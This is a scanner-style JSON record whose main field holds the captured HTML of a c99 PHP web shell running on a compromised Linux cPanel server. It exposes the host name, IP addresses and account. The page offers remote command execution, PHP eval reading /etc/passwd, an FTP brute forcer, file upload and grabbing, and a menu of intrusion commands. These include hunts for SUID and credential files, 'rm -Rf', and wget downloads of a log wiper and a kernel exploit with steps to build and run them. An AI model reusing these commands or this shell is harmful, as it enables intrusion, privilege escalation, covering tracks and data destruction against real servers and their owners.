{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "lib": "May run code from a DLL",
            "mkdir": "May create a directory",
            "output": "May write to a file",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.164.235>87.177.164.235</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[ensure_vhost_includes]&nbsp;ensure_vhost_includes (12.22 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=ensure_vhost_includes&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=txt&d=%2Fscripts%2F\"><b><u>[txt]</u></b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ensure_vhost_includes&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=ensure_vhost_includes&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><pre>#!/usr/bin/perl\n# cpanel - ensure_vhost_includes                  Copyright(c) 2010 cPanel, Inc.\n#                                                           All rights Reserved.\n# copyright@cpanel.net                                         http://cpanel.net\n# This code is subject to the cpanel license. Unauthorized copying is prohibited\n\nBEGIN { unshift @INC, '/usr/local/cpanel'; }\n\n# use strict;\n# use warnings;\nuse Cpanel::CPAN::Getopt::Param         ();\nuse Cpanel::EditHttpdconf               ();\nuse Cpanel::Services                    ();\nuse Cpanel::Config::LoadUserDomains     ();\nuse Cpanel::DataStore                   ();\nuse Cpanel::PwCache                     ();\nuse Cpanel::PHPINI                      ();\nuse Cpanel::AcctUtils::DomainOwnerCache ();\nuse Cpanel::AcctUtils::Owner            ();\nuse Cpanel::AdvConfig::apache::vhost    ();\nuse Cpanel::DomainTools                 ();\n\nmy %errors;\nmy @PHP_INI_INCLUDE_PATHS_CACHE;\nmy $php_ini_include_paths_have_been_cached = 0;\n\nCpanel::AcctUtils::DomainOwnerCache::cachedomainowners();\n\n# Not Needed\n#Cpanel::AcctUtils::Owner::build_trueuserowners_cache();\n\nmy %checks = (\n    'cp_bw_all_limit.conf' =&gt; {\n        'name' =&gt; 'bandwidth limit',\n\n        # 'user' ...\n        'domain' =&gt; {\n            'on' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                if ( -x '/scripts/setbwlimit' ) {\n                    system '/scripts/setbwlimit', '--domain=' . $domain, '--limit=' . $value;\n                }\n                else {\n                    if ( !exists $errors{'/scripts/setbwlimit missing or not executable!'} ) {\n                        print &quot;/scripts/setbwlimit missing or not executable!\\n&quot;;\n                        $errors{'/scripts/setbwlimit missing or not executable!'} = 0;\n                    }\n                    $errors{'/scripts/setbwlimit missing or not executable!'}++;\n                }\n            },\n            'off' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                Cpanel::EditHttpdconf::del_vhost_include(\n                    {\n                        'domain'                          =&gt; $domain,\n                        'file'                            =&gt; 'cp_bw_all_limit.conf',\n                        'restart_apache'                  =&gt; 0,\n                        'ensure_vhost_include_directives' =&gt; 0,\n                    }\n                );\n            },\n        },\n    },\n    'cp_jkmount.conf' =&gt; {\n        'name' =&gt; 'tomcat setting',\n\n        # 'user' ...\n        'domain' =&gt; {\n            'on' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                if ( -x '/scripts/addservlets2' ) {\n                    system '/scripts/addservlets2', '--domain=' . $domain;\n                }\n                else {\n                    if ( !exists $errors{'/scripts/addservlets2 missing or not executable!'} ) {\n                        print &quot;/scripts/addservlets2 missing or not executable!\\n&quot;;\n                        $errors{'/scripts/addservlets2 missing or not executable!'} = 0;\n                    }\n                    $errors{'/scripts/addservlets2 missing or not executable!'}++;\n                }\n            },\n            'off' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                Cpanel::EditHttpdconf::del_vhost_include(\n                    {\n                        'domain'                          =&gt; $domain,\n                        'file'                            =&gt; 'cp_jkmount.conf',\n                        'restart_apache'                  =&gt; 0,\n                        'ensure_vhost_include_directives' =&gt; 0,\n                    }\n                );\n            },\n        },\n    },\n    'cp_php_magic_include_path.conf' =&gt; {\n        'name' =&gt; 'magic php include path',\n\n        # 'user' ...\n        'domain' =&gt; {\n            'on' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                my $homedir = ( Cpanel::PwCache::getpwnam $user )[7];\n\n                if ( !$php_ini_include_paths_have_been_cached ) {\n                    @PHP_INI_INCLUDE_PATHS_CACHE = Cpanel::PHPINI::include_paths();\n                    $php_ini_include_paths_have_been_cached++;\n                }\n\n                my @INCP = @PHP_INI_INCLUDE_PATHS_CACHE;\n                if ( $homedir &amp;&amp; $homedir ne '' &amp;&amp; $homedir ne '/' ) {\n                    push @INCP, $homedir . '/php';\n                }\n                my $php5path = join( ':', @INCP );\n                my $first_include = shift @INCP;\n                unshift @INCP, '/usr/local/php4/lib/php';\n                unshift @INCP, '/usr/php4/lib/php';\n                unshift @INCP, $first_include;\n                my $php4path = join( ':', @INCP );\n                my $content = &lt;&lt;&quot;END_CONT&quot;;\n    &lt;IfModule concurrent_php.c&gt;\n       php4_admin_value include_path &quot;$php4path&quot;\n       php5_admin_value include_path &quot;$php5path&quot;\n    &lt;/IfModule&gt;\n    &lt;IfModule !concurrent_php.c&gt;\n       &lt;IfModule mod_php4.c&gt;\n          php_admin_value include_path &quot;$php4path&quot;\n       &lt;/IfModule&gt;\n       &lt;IfModule mod_php5.c&gt;\n          php_admin_value include_path &quot;$php5path&quot;\n       &lt;/IfModule&gt;\n       &lt;IfModule sapi_apache2.c&gt; \n          php_admin_value include_path &quot;$php4path&quot;\n       &lt;/IfModule&gt;\n    &lt;/IfModule&gt;\n\nEND_CONT\n\n                Cpanel::EditHttpdconf::add_vhost_include(\n                    {\n                        'user'                            =&gt; $user,\n                        'file'                            =&gt; 'cp_php_magic_include_path.conf',\n                        'restart_apache'                  =&gt; 0,\n                        'ensure_vhost_include_directives' =&gt; 0,\n                        'content'                         =&gt; {\n                            'std' =&gt; {\n                                '1' =&gt; $content,\n                                '2' =&gt; $content,\n                            },\n                            'ssl' =&gt; {\n                                '1' =&gt; $content,\n                                '2' =&gt; $content,\n                            },\n                        },\n                    }\n                );\n                return 'once_per_user';\n            },\n            'off' =&gt; sub {\n                my ( $user, $domain, $value, $verbose ) = @_;\n                Cpanel::EditHttpdconf::del_vhost_include(\n                    {\n                        'user'                            =&gt; $user,\n                        'file'                            =&gt; 'cp_php_magic_include_path.conf',\n                        'restart_apache'                  =&gt; 0,\n                        'ensure_vhost_include_directives' =&gt; 0,\n                    }\n                );\n                return 'once_per_user';\n            },\n        },\n    },\n);\n\nmy $help_cr = sub {\n    print &lt;&lt;&quot;END_HELP&quot;;\nEnsure all vhost includes are setup as per userdata.\n\n$0 --help  (this screen)\n$0 --all-users | --user=USERNAME1 [--user=USERNAME2 --user=...] | --domain=DOMAIN1 [--domain=DOMAIN2 --domain=...]\n\n'--verbose' have output reporting what it is doing\n\n'--skip-file-check' will skip the check that makes sure the setting in the userdata reflects what is on the filesystem\n\n'--no-restart' will skip restarting Apache after httpd.conf is updated\n\n'--skip-conf-rebuild' do not rebuild httpd.conf, implies --no-restart\n\n'--debug' implies --verbose and makes the verbose information include more arcane information about what it's doing\n\nEND_HELP\n    exit;\n};\n\n# purposefully don't have --force-value and --only-check in help\n\nmy $prm = Cpanel::CPAN::Getopt::Param-&gt;new(\n    {    #issafe\n        'help_coderef' =&gt; $help_cr,\n    }\n);\n\nif ( $prm-&gt;exists_param('only-check') ) {\n    my %only;\n    for my $check ( $prm-&gt;get_param('only-check') ) {\n        $only{$check} = 1 if exists $checks{$check};\n    }\n\n    for my $real_check ( sort keys %checks ) {\n        delete $checks{$real_check} if !exists $only{$real_check};\n    }\n\n    die &quot;--only-check arguments removed all checks&quot; if !keys %checks;\n}\n\nmy %user_map = %{ Cpanel::Config::LoadUserDomains::loaduserdomains( undef, 0, 1 ) };\nmy @users;\nmy $do_domain_filter = 0;\n\nif ( $prm-&gt;get_param('all-users') ) {\n    @users = sort keys %user_map;\n}\nelsif ( $prm-&gt;get_param('user') ) {\n    foreach my $user ( $prm-&gt;get_param('user') ) {\n        if ( $user &amp;&amp; defined $user_map{$user} ) {\n            push @users, $user;\n        }\n        else {\n            print &quot;Invalid user: $user\\n&quot;;\n        }\n    }\n    die &quot;No valid --user arguments given&quot; unless @users;\n}\nelsif ( $prm-&gt;get_param('domain') ) {\n    $do_domain_filter = {};\n    for my $dom ( $prm-&gt;get_param('domain') ) {\n        $dom = Cpanel::DomainTools::normalize($dom);\n        if ( Cpanel::DomainTools::is_valid($dom) ) {\n            $do_domain_filter-&gt;{$dom}++;\n        }\n        else {\n            print &quot;Invalid domain: $dom\\n&quot;;\n        }\n    }\n\n    die &quot;No valid --domain arguments given&quot; unless keys %{$do_domain_filter};\n\n  USER_NAME:\n    for my $user ( keys %user_map ) {\n      USER_DOM:\n        for my $user_dom ( @{ $user_map{$user} } ) {\n            if ( exists $do_domain_filter-&gt;{$user_dom} ) {\n                push @users, $user;\n                next USER_NAME;\n            }\n        }\n    }\n\n    die &quot;--domain arguments do not belong to any user&quot; unless @users;\n}\nelse {\n    $help_cr-&gt;();\n}\n\nmy $verbose = $prm-&gt;get_param('debug') || $prm-&gt;get_param('verbose') ? 1 : 0;\n\nmy %domains_processed;\n\nif ( $prm-&gt;get_param('skip-file-check') ) {\n    print &quot;Skipping file check as per --skip-file-check\\n\\n&quot;;\n}\nelse {\n    my $userdata = '/var/cpanel/userdata';\n  USER:\n    for my $user (@users) {\n        my %once;\n        print &quot;Starting $user...\\n&quot; if $verbose;\n        my $userdir = &quot;$userdata/$user&quot;;\n        next USER if !-d $userdir;\n        next USER if ref $user_map{$user} ne 'ARRAY';\n\n      DOM:\n        for my $dom ( sort @{ $user_map{$user} } ) {\n\n            if ( ref $do_domain_filter eq 'HASH' &amp;&amp; !exists $do_domain_filter-&gt;{$dom} ) {\n                print &quot;\\tProcessing $dom...\\n\\t\\tSkipping $dom since it was not passed in via --domain flag\\n&quot; if $prm-&gt;get_param('debug');\n                next DOM;\n            }\n\n            print &quot;\\tProcessing $dom...\\n&quot; if $verbose;\n\n            my $domfile = &quot;$userdir/$dom&quot;;\n            next DOM if !-e $domfile;\n            $domains_processed{$dom}++;\n\n            my $vhost_hr = Cpanel::DataStore::fetch_ref($domfile);\n\n          CHECK:\n            for my $check ( sort keys %checks ) {\n                next CHECK if exists $once{$check};\n\n                print &quot;\\t\\tChecking $checks{ $check }-&gt;{'name'}...&quot; if $verbose;\n\n                my $val = $prm-&gt;exists_param('force-value') ? $prm-&gt;get_param('force-value') : $vhost_hr-&gt;{$check};\n                my @args = ( $user, $dom, $val, $verbose );\n\n                my $rc;\n\n                if ($val) {\n                    print &quot;On\\n&quot; if $verbose;\n                    $rc = $checks{$check}-&gt;{'domain'}{'on'}-&gt;(@args);\n                }\n                else {\n                    print &quot;Off\\n&quot; if $verbose;\n                    $rc = $checks{$check}-&gt;{'domain'}{'off'}-&gt;(@args);\n                }\n                $once{$check} = 1 if $rc eq 'once_per_user';\n            }\n        }\n    }\n}\n\nif ( $prm-&gt;get_param('skip-conf-rebuild') ) {\n    print &quot;Skipping httpd.conf rebuild as per --skip-conf-rebuild\\n&quot; if $verbose;\n    if ( $prm-&gt;get_param('skip-file-check') ) {\n        print &quot;Specifying both --skip-conf-rebuild and --skip-file-check means nothing was done.\\n&quot;;\n    }\n}\nelse {\n    print &quot;Ensuring that Include entries are correct...\\n&quot; if $verbose;\n\n    # ? other threshhold of when individual vhost building is less efficient than just rebuilding the entire httpd.conf ?\n    if ( keys %domains_processed &lt; 3 ) {\n        for my $domain ( keys %domains_processed ) {\n            Cpanel::AdvConfig::apache::vhost::do_vhost($domain) or warn(&quot;Could not rebuild vhost for $domain&quot;);\n        }\n    }\n    else {\n        Cpanel::EditHttpdconf::rebuild_httpd_conf(\n            sub {\n                my ( $line, $exit_loop_boolean_sr ) = @_;\n                return $line;    # Cpanel::SafeRun::Dynamic::livesaferun() prints whatever is returned\n            }\n        );\n    }\n\n    local $Whostmgr::UI::nohtml = 1;\n    if ( $prm-&gt;get_param('no-restart') ) {\n        print &quot;Skipping Apache restart as per --no-restart\\n&quot; if $verbose;\n    }\n    else {\n        print &quot;Restarting Apache...\\n&quot; if $verbose;\n        Cpanel::Services::restartservice( 'httpd', 1, 1 );\n    }\n}\n</pre>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/scripts/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" 